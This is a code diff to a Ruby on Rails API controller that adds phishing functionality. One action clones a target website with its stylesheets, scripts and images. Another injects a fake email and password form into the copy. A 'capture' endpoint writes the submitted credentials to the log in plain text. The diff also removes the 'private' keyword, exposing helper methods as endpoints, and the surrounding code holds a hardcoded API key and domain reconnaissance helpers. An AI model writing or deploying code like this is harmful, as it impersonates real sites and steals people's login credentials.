@@ -153,7 +153,71 @@ class Api::V1::UsersController < ApplicationController
     end
   end
 
-  private
+  def download_phishing_target
+    url = params[:url]
+    return render json: { error: "URL est obligatoire" }, status: :unprocessable_entity if url.blank?
+  
+    begin
+      domain_name = URI.parse(url).host
+      folder_path = Rails.root.join('public', 'phishing_pages', domain_name)
+      FileUtils.mkdir_p(folder_path)
+  
+      html_content = URI.open(url).read
+      doc = Nokogiri::HTML(html_content)
+  
+      download_resources(doc, folder_path, url)
+  
+      inject_phishing_form(doc)
+  
+      html_file_path = File.join(folder_path, 'index.html')
+      File.write(html_file_path, doc.to_html)
+  
+      render json: {
+        message: "Page de phishing générée avec succès.",
+        path: "/phishing_pages/#{domain_name}/index.html"
+      }
+    rescue StandardError => e
+      render json: { error: "Erreur lors du téléchargement de la page : #{e.message}" }, status: :unprocessable_entity
+    end
+  end
+  
+
+  def create_phishing_page
+    target_email = params[:email]
+    fake_url = params[:fake_url]
+    content = params[:content]
+    input_path = Rails.root.join('public', 'downloaded_phishing.html')
+    output_path = Rails.root.join('public', 'generated_phishing.html')
+  
+    PhishingPageGenerator.generate_phishing_page(target_email, fake_url, content, input_path, output_path)
+  
+    render json: { message: 'Page de phishing générée.', path: output_path }, status: :ok
+  rescue => e
+    render json: { error: "Erreur : #{e.message}" }, status: :unprocessable_entity
+  end
+
+  def capture
+    email = params[:email]
+    password = params[:password]
+  
+    Rails.logger.info("Email capturé : #{email}")
+    Rails.logger.info("Mot de passe capturé : #{password}")
+  
+    render json: { message: "Données capturées avec succès." }, status: :ok
+  end   
+
+  def inject_phishing_form(doc)
+    doc.at('body').add_child(<<-HTML)
+      <form action="/api/v1/users/capture" method="POST" style="margin: 20px; padding: 20px; border: 1px solid red;">
+        <label for="email">Email :</label>
+        <input type="email" name="email" required>
+        <label for="password">Mot de passe :</label>
+        <input type="password" name="password" required>
+        <button type="submit">Envoyer</button>
+      </form>
+    HTML
+  end
+  
 
   def retrieve_subdomains(domain)
     api_key = 'fTRMKRxZjR6co6rNG9cotUXQ5lCBAhBL'  
@@ -216,6 +280,58 @@ class Api::V1::UsersController < ApplicationController
     mx_records.any?
   rescue Resolv::ResolvError
     false
+  end
+
+  def download_resources(doc, folder_path, base_url)
+    base_uri = URI.parse(base_url)
+
+    doc.css('link[rel="stylesheet"]').each do |link|
+      href = link['href']
+      next unless href
+  
+      css_url = URI.join(base_url, href).to_s
+      file_name = File.basename(URI.parse(css_url).path)
+      file_path = File.join(folder_path, file_name)
+  
+      begin
+        File.write(file_path, URI.open(css_url).read)
+        link['href'] = file_name
+      rescue StandardError => e
+        Rails.logger.error "Erreur CSS: #{e.message}"
+      end
+    end
+  
+    doc.css('script[src]').each do |script|
+      src = script['src']
+      next unless src
+  
+      js_url = URI.join(base_url, src).to_s
+      file_name = File.basename(URI.parse(js_url).path)
+      file_path = File.join(folder_path, file_name)
+  
+      begin
+        File.write(file_path, URI.open(js_url).read)
+        script['src'] = file_name
+      rescue StandardError => e
+        Rails.logger.error "Erreur JS: #{e.message}"
+      end
+    end
+  
+    doc.css('img[src]').each do |img|
+      src = img['src']
+      next unless src
+  
+      img_url = URI.join(base_url, src).to_s
+      file_name = File.basename(URI.parse(img_url).path)
+      file_path = File.join(folder_path, file_name)
+  
+      begin
+        File.write(file_path, URI.open(img_url).read)
+        img['src'] = file_name
+      rescue StandardError => e
+        Rails.logger.error "Erreur image: #{e.message}"
+      end
+    end
   end
 
   def model
